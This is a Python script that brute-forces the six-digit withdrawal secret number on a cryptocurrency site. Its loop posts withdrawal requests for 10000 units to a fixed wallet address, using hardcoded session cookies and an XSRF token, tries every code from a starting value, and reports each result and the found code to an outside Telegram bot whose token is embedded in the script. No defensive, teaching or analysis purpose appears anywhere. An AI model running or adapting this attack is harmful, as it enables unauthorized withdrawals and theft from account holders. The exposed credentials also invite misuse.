import requests
import os
from keep_alive import keep_alive


def guess_number(start_number):
  start_number = str(start_number).zfill(6)
  for i in range(int(start_number), 1000000):
    guess = str(i).zfill(6)

    cookies = {
        'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d':
        'eyJpdiI6IjlLaTl6N1FGRjNBWE9kRlk5aVRVM2c9PSIsInZhbHVlIjoiZUp4cXZuWHpGeDJUUnBwOW0xREpXaEVIT0J3cUtyM3dWT05SWm5LeUxhejBDZDRrQjhyUS9YVTZxQkp0VmVtQXBvL2dhSUwyVEI4SnhPcEU0eVZZYitaU2RvMjgwbGVVTU4zSmp3ZUgyUStZb0NaTWxwWHFVL0lWUi9UcEMxTEhjWXBnRWNTeXE0ZXQ4YWVUYW9PUVNwZFRLWlFZeUxxeFduS2x3TmFwakFXMXoyNG5HeklwNU02YUdlVHc5Y2NiL3BkVHNRUjB3K29LTnZ4Wjl0NUdDMHhuNk5OMFZhU3h4amV3TklRMndJdz0iLCJtYWMiOiJlOGQzY2Y1MDMxZTBlOWY1ZGNhM2RlOGQxODI2ZmVmYjFmODExZjE5ZGNlOWQ1ZmVjOGUwYjkyNTc5MjJhMDBmIiwidGFnIjoiIn0%3D',
        'XSRF-TOKEN':
        'eyJpdiI6InZpc2h2Y1dFczNiaWpmQmF1Nlhmd2c9PSIsInZhbHVlIjoiZjU2VHg3ZllrZGYwS1RZNXVETUJiMWJGaXVsSlZPVkxjSVBlWm9jNmRVOEVQTWlTK2djSDcxaG9mWDVDK0tmdWN5MkEwZlVHTDU4NGdydTVVWVE5WnpCTlFWaFNGSHgyejZMWkh4OTRJclZqQlhXWjBhYzMzcTEvbC8vMzRuWmwiLCJtYWMiOiI3ZmY1MGYzNzgxYjJlMmExMGVlYWZkNTUyNTg3YzlkNDNiNjhjOWRmZDUxMGJhODRjZjQxY2NiMDQyMTBmNDVlIiwidGFnIjoiIn0%3D',
        'bee_coin_session':
        'eyJpdiI6IlY0LzNrSHJ2UDIrVWN6T1RxcWVFbFE9PSIsInZhbHVlIjoiT3Faa3hMVGRMSE5pNzJqLzFCa0Y1dzZNdnNPbWF4ejlaNm5aWlpNc1F2amFDMWlmbVZIRm5PWHllWVNrZTVOTXRMaWpTcWdlMFNvR1BwcTgzTUoyWUt6ZjB2eS9FNkFLWVZRTnQ3UjhLSE1neDFmUzFJdVVwSkJqd3lvdG9JbkQiLCJtYWMiOiIwNzBkMDgzM2U0MDY2NzQ2MDE4YjljYjQ5MTkxMTY0YjFlNmVhNWYxMTBhNjI0YTJlNjdiYTI4ZmQ5MmNmOGY3IiwidGFnIjoiIn0%3D',
    }

    headers = {
        'authority':
        'www.beecoinusdt.com',
        'accept':
        'application/json, text/plain, */*',
        'accept-language':
        'en-US,en;q=0.9',
        'content-type':
        'application/json',
        # 'cookie': 'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjlLaTl6N1FGRjNBWE9kRlk5aVRVM2c9PSIsInZhbHVlIjoiZUp4cXZuWHpGeDJUUnBwOW0xREpXaEVIT0J3cUtyM3dWT05SWm5LeUxhejBDZDRrQjhyUS9YVTZxQkp0VmVtQXBvL2dhSUwyVEI4SnhPcEU0eVZZYitaU2RvMjgwbGVVTU4zSmp3ZUgyUStZb0NaTWxwWHFVL0lWUi9UcEMxTEhjWXBnRWNTeXE0ZXQ4YWVUYW9PUVNwZFRLWlFZeUxxeFduS2x3TmFwakFXMXoyNG5HeklwNU02YUdlVHc5Y2NiL3BkVHNRUjB3K29LTnZ4Wjl0NUdDMHhuNk5OMFZhU3h4amV3TklRMndJdz0iLCJtYWMiOiJlOGQzY2Y1MDMxZTBlOWY1ZGNhM2RlOGQxODI2ZmVmYjFmODExZjE5ZGNlOWQ1ZmVjOGUwYjkyNTc5MjJhMDBmIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InZpc2h2Y1dFczNiaWpmQmF1Nlhmd2c9PSIsInZhbHVlIjoiZjU2VHg3ZllrZGYwS1RZNXVETUJiMWJGaXVsSlZPVkxjSVBlWm9jNmRVOEVQTWlTK2djSDcxaG9mWDVDK0tmdWN5MkEwZlVHTDU4NGdydTVVWVE5WnpCTlFWaFNGSHgyejZMWkh4OTRJclZqQlhXWjBhYzMzcTEvbC8vMzRuWmwiLCJtYWMiOiI3ZmY1MGYzNzgxYjJlMmExMGVlYWZkNTUyNTg3YzlkNDNiNjhjOWRmZDUxMGJhODRjZjQxY2NiMDQyMTBmNDVlIiwidGFnIjoiIn0%3D; bee_coin_session=eyJpdiI6IlY0LzNrSHJ2UDIrVWN6T1RxcWVFbFE9PSIsInZhbHVlIjoiT3Faa3hMVGRMSE5pNzJqLzFCa0Y1dzZNdnNPbWF4ejlaNm5aWlpNc1F2amFDMWlmbVZIRm5PWHllWVNrZTVOTXRMaWpTcWdlMFNvR1BwcTgzTUoyWUt6ZjB2eS9FNkFLWVZRTnQ3UjhLSE1neDFmUzFJdVVwSkJqd3lvdG9JbkQiLCJtYWMiOiIwNzBkMDgzM2U0MDY2NzQ2MDE4YjljYjQ5MTkxMTY0YjFlNmVhNWYxMTBhNjI0YTJlNjdiYTI4ZmQ5MmNmOGY3IiwidGFnIjoiIn0%3D',
        'origin':
        'https://www.beecoinusdt.com',
        'referer':
        'https://www.beecoinusdt.com/users/withdrawalForm/3',
        'sec-ch-ua':
        '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile':
        '?0',
        'sec-ch-ua-platform':
        '"Windows"',
        'sec-fetch-dest':
        'empty',
        'sec-fetch-mode':
        'cors',
        'sec-fetch-site':
        'same-origin',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'x-xsrf-token':
        'eyJpdiI6InZpc2h2Y1dFczNiaWpmQmF1Nlhmd2c9PSIsInZhbHVlIjoiZjU2VHg3ZllrZGYwS1RZNXVETUJiMWJGaXVsSlZPVkxjSVBlWm9jNmRVOEVQTWlTK2djSDcxaG9mWDVDK0tmdWN5MkEwZlVHTDU4NGdydTVVWVE5WnpCTlFWaFNGSHgyejZMWkh4OTRJclZqQlhXWjBhYzMzcTEvbC8vMzRuWmwiLCJtYWMiOiI3ZmY1MGYzNzgxYjJlMmExMGVlYWZkNTUyNTg3YzlkNDNiNjhjOWRmZDUxMGJhODRjZjQxY2NiMDQyMTBmNDVlIiwidGFnIjoiIn0=',
    }

    json_data = {
        'network_id': '3',
        'wallet_address': 'TZJaxweBJvW7EQSTzBKb6f9L3fhSdPxrPr',
        'amount': '10000',
        'secret_number': guess,
        'user_id': 374,
    }

    response = requests.post(
        'https://www.beecoinusdt.com/users/sendWithdrawalRequest',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    # Your code to check if the guess is correct goes here
    # For demonstration purposes, let's assume the correct number is "123456"
    if 'secret number is invalid' in response.text:
      os.system('cls')
      print(response.text)
      print("False:", guess)
      with open('example.txt', 'w') as file:
        # Write the text you want to add
        file.write(f"{guess}\n")
      i = "False:", guess
      requests.get(
          f'https://api.telegram.org/bot6851743423:AAEoVmDh1SsMiFjperWWc70Vl-c4jk8l5zI/sendMessage?chat_id=1083026527&text={i}'
      )

    elif 'CSRF token mismatch.' in response.text:
      print(response.text)
      i = "Token Error End In: ", guess
      with open('example.txt', 'w') as file:
        # Write the text you want to add
        file.write(f"{guess}\n")
      requests.get(
          f'https://api.telegram.org/bot6851743423:AAEoVmDh1SsMiFjperWWc70Vl-c4jk8l5zI/sendMessage?chat_id=1083026527&text={i}'
      )
      break

    elif 'Error' in response.text:
      response = requests.post(
          'https://www.beecoinusdt.com/users/sendWithdrawalRequest',
          cookies=cookies,
          headers=headers,
          json=json_data,
      )
    else:
      print(response.text)
      print('Fount it! ', guess)
      i = 'Code is: ', guess
      with open('example.txt', 'w') as file:
        # Write the text you want to add
        file.write(f"Found {guess}\n")
      requests.get(
          f'https://api.telegram.org/bot6851743423:AAEoVmDh1SsMiFjperWWc70Vl-c4jk8l5zI/sendMessage?chat_id=1083026527&text={i}'
      )
      break


start_number = 4634  # Example starting number
keep_alive()
guess_number(start_number)
